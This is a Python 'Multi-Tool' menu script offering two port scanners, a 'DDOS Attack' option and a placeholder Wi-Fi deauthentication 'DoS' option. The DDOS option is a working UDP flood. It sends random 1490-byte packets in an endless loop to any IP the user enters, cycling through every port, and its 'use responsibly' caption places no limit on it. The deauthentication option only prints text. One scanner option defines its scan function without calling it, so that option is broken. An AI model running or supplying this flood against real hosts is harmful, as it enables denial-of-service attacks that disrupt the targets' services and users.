import time
import os 
import socket
import random
import pyfiglet
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama
init()

# Create a box around the "Multi-Tool" header using ASCII art
header = pyfiglet.figlet_format("Multi-Tool")
header_box = (
    f"{Fore.YELLOW}+{'-' * (len(header.splitlines()[0]) + 2)}+\n"  # Top border
    f"| {header.strip()} |\n"  # Header content
    f"+{'-' * (len(header.splitlines()[0]) + 2)}+\n"  # Bottom border
)

# Print the box with header text
print(Fore.CYAN + header_box + Style.RESET_ALL)
print(Fore.YELLOW + "Welcome to the Multi-Tool!" + Style.RESET_ALL)
print(Fore.GREEN + "Developed by iamgeo1\n" + Style.RESET_ALL)

# Define your programs
def program0():
    banner = pyfiglet.figlet_format("Port Scanner")
    print(Fore.LIGHTBLUE_EX + banner + Style.RESET_ALL)

    print(Fore.YELLOW + "Developer: iamgeo1" + Style.RESET_ALL)
    print(Fore.CYAN + "This tool scans a specified range of ports for a given IP address." + Style.RESET_ALL)

    target_ip = input(Fore.RED + "Enter Target IP: " + Style.RESET_ALL)
    start_port = int(input(Fore.RED + "Enter Start Port: " + Style.RESET_ALL))
    end_port = int(input(Fore.RED + "Enter End Port: " + Style.RESET_ALL))

    def port_scanner(ip, start_port, end_port):
        print(f"\n{Fore.YELLOW}Scanning IP: {ip} from port {start_port} to {end_port}...{Style.RESET_ALL}\n")

        start_time = datetime.now()

        for port in range(start_port, end_port + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    print(Fore.GREEN + f"Port {port}: OPEN" + Style.RESET_ALL)
                sock.close()
            except Exception as e:
                print(Fore.RED + f"Error scanning port {port}: {e}" + Style.RESET_ALL)
                continue

        end_time = datetime.now()
        total_time = end_time - start_time
        print(Fore.YELLOW + f"\nScanning completed in: {total_time}" + Style.RESET_ALL)

def program1():
    banner = pyfiglet.figlet_format("DDOS Attack")
    print(Fore.LIGHTMAGENTA_EX + banner + Style.RESET_ALL)

    print(Fore.YELLOW + "Developer: iamgeo1" + Style.RESET_ALL)
    print(Fore.CYAN + "A simple DDOS attack tool to test network security. Use responsibly." + Style.RESET_ALL)

    ip = input(Fore.RED + "Enter Target IP: " + Style.RESET_ALL)
    port = int(input(Fore.RED + "Enter Target Port: " + Style.RESET_ALL))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0

    print(Fore.YELLOW + f"Starting DDOS attack on {ip}:{port}...\n" + Style.RESET_ALL)
    time.sleep(3)

    colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN]
    color_index = 0

    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1

        print(colors[color_index % len(colors)] + f"Sent {sent} packets to {ip} through port {port}" + Style.RESET_ALL)
        color_index += 1

        if port > 65534:
            port = 1

def program2():
    ascii_art = pyfiglet.figlet_format("Port Scanner 2")
    print(Fore.LIGHTGREEN_EX + ascii_art + Style.RESET_ALL)

    print(Fore.YELLOW + "Developer: iamgeo1" + Style.RESET_ALL)
    print(Fore.CYAN + "Another version of the port scanner using enhanced visuals.\n" + Style.RESET_ALL)

    target_ip = input(Fore.RED + "Enter Target IP: " + Style.RESET_ALL)
    start_port = int(input(Fore.RED + "Enter Start Port: " + Style.RESET_ALL))
    end_port = int(input(Fore.RED + "Enter End Port: " + Style.RESET_ALL))

    def port_scanner(target_ip, start_port, end_port):
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(Fore.GREEN + f"Port {port} is open" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Port {port} is closed" + Style.RESET_ALL)
            sock.close()

    port_scanner(target_ip, start_port, end_port)

def program4():
    ascii_art = pyfiglet.figlet_format("DoS Attack")
    print(Fore.LIGHTRED_EX + ascii_art + Style.RESET_ALL)

    print(Fore.YELLOW + "Developer: iamgeo1" + Style.RESET_ALL)
    print(Fore.CYAN + "A deauthentication attack tool to disrupt wireless network connections.\n" + Style.RESET_ALL)

    print(Fore.RED + "Please run this tool with appropriate permissions." + Style.RESET_ALL)
    print(Fore.RED + "This tool will only work on Linux systems with WiFi adapters supporting monitor mode." + Style.RESET_ALL)

# Main menu with regular text and color options
def main_menu():
    print(Fore.YELLOW + "\n--- Main Menu ---" + Style.RESET_ALL)
    while True:
        print(Fore.LIGHTGREEN_EX + "0 - Port Scanner" + Style.RESET_ALL)
        print(Fore.LIGHTBLUE_EX + "1 - DDOS Attack" + Style.RESET_ALL)
        print(Fore.LIGHTCYAN_EX + "2 - Port Scanner (Colorama)" + Style.RESET_ALL)
        print(Fore.LIGHTMAGENTA_EX + "4 - DoS Attack Tool" + Style.RESET_ALL)
        print(Fore.RED + "5 - Exit" + Style.RESET_ALL)

        choice = input(Fore.YELLOW + "\nEnter your choice: " + Style.RESET_ALL)

        if choice == "0":
            program0()
        elif choice == "1":
            program1()
        elif choice == "2":
            program2()
        elif choice == "4":
            program4()
        elif choice == "5":
            print(Fore.RED + "Exiting the program." + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)

if __name__ == "__main__":
    main_menu()